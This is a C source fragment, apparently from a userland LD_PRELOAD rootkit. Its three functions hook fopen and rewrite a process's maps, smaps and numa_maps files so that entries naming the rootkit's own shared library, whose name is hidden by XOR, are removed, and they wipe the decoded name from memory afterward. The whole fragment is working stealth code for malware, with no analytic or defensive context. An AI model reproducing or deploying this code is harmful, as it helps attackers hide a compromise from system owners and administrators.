static FILE *forge_maps(const char *pathname){
	FILE *o = tmpfile(), *pnt;
	char buf[LINE_MAX];
	hook(CFOPEN);
	if((pnt = call(CFOPEN, pathname, "r")) == NULL){
		errno = ENOENT;
		fclose(o);
		return NULL;
	}
	xor(t_bdvlso,BDVLSO);
	while(fgets(buf, sizeof(buf), pnt) != NULL)
		if(!strstr(buf,t_bdvlso))
			fputs(buf, o);
	clean(t_bdvlso);
	memset(buf, 0, strlen(buf));
	fclose(pnt);
	fseek(o, 0, SEEK_SET);
	return o;
}

static FILE *forge_smaps(const char *pathname){
	FILE *o = tmpfile(), *pnt;
	char buf[LINE_MAX];
	int i = 0;
	hook(CFOPEN);
	if((pnt = call(CFOPEN, pathname, "r")) == NULL){
		errno = ENOENT;
		fclose(o);
		return NULL;
	}
	xor(t_bdvlso,BDVLSO);
	while(fgets(buf, sizeof(buf), pnt) != NULL){
		if(i > 0)
			i++;
		if(i > 15)
			i = 0;
		if(strstr(buf,t_bdvlso))
			i = 1;
		if(i == 0)
			fputs(buf, o);
	}
	clean(t_bdvlso);
	memset(buf, 0, strlen(buf));
	fclose(pnt);
	fseek(o, 0, SEEK_SET);
	return o;
}

static FILE *forge_numamaps(const char *pathname){
	FILE *o = tmpfile(), *pnt;
	char buf[LINE_MAX];
	hook(CFOPEN);
	if((pnt = call(CFOPEN, pathname, "r")) == NULL){
		errno = ENOENT;
		fclose(o);
		return NULL;
	}
	xor(t_bdvlso,BDVLSO);
	while(fgets(buf, sizeof(buf), pnt) != NULL)
		if(!strstr(buf,t_bdvlso))
			fputs(buf, o);
	clean(t_bdvlso);
	memset(buf, 0, strlen(buf));
	fclose(pnt);
	fseek(o, 0, SEEK_SET);
	return o;
}
